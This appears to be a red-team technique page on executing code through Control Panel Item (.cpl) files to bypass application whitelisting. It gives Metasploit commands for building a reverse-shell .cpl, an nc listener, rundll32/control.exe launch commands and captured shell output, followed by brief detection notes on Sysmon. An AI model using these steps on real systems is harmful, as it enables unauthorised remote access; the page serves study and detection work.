---
description: Control Panel Item code execution - bypass application whitelisting.
---

# Control Panel Item

### Execution

Generating a simple x64 reverse shell in a .cpl format:

{% code title="attacker\@local" %}
```csharp
msfconsole
use windows/local/cve_2017_8464_lnk_lpe
set payload windows/x64/shell_reverse_tcp
set lhost 10.0.0.5
exploit

root@~# nc -lvp 4444
listening on [any] 4444 ...
```
{% endcode %}

We can see that the .cpl is simply a DLL with DllMain function exported:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHIXU2zFIWU9O9COZIr%2F-LHIXQpMGJKwzgdWzy0y%2Flnk-dllmain.png?alt=media\&token=2368ca38-a67e-4673-8aba-8b93cc95aeea)

A quick look at the dissasembly of the dll suggests that rundll32.exe will be spawned, a new thread will be created in suspended mode, which most likely will get injected with our shellcode and eventually resumed to execute that shellcode:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHIZQj8Q9-w8aZRgnOX%2F-LHIZUKHIjXv2Va0DZfB%2Flnk-dissasm.png?alt=media\&token=4ea6534e-8f19-4b68-b2ec-748e2929861e)

Invoking the shellcode via control.exe:

{% code title="attacker\@victim" %}
```csharp
control.exe .\FlashPlayerCPLApp.cpl
# or
rundll32.exe shell32.dll,Control_RunDLL file.cpl
# or
rundll32.exe shell32.dll,Control_RunDLLAsUser file.cpl
```
{% endcode %}

Attacking machine receiving the reverse shell:

{% code title="attacker\@local" %}
```csharp
10.0.0.2: inverse host lookup failed: Unknown host
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.2] 49346
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
```
{% endcode %}

### Observations

Note how rundll32 spawns cmd.exe and establishes a connection back to the attacker - these are signs that should raise your suspicion when investingating a host for a compromise:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHISBP3bp2vx8W8uMyo%2F-LHISXwhbMRB55-2L0r4%2Flnk-connection.png?alt=media\&token=08e188cd-89ec-47c3-bcd9-1c21905c54ff)

As always, sysmon logging can help in finding suspicious commandlines being executed in your environment:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LHIoYl6UvIhgtp9Rvjn%2F-LHIoWGfiOuoxKPxwSH4%2Flnk-sysmon.png?alt=media\&token=e030af82-28a7-4216-9f2f-8b60d1f3c75c)

### Bonus - Create Shortcut With PowerShell

```bash
$TargetFile = "$env:SystemRoot\System32\calc.exe"
$ShortcutFile = "C:\experiments\cpl\calc.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$Shortcut.TargetPath = $TargetFile
$Shortcut.Save()
```

### References

{% embed url="https://attack.mitre.org/wiki/Technique/T1196" %}

{% embed url="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1060/T1060.md" %}
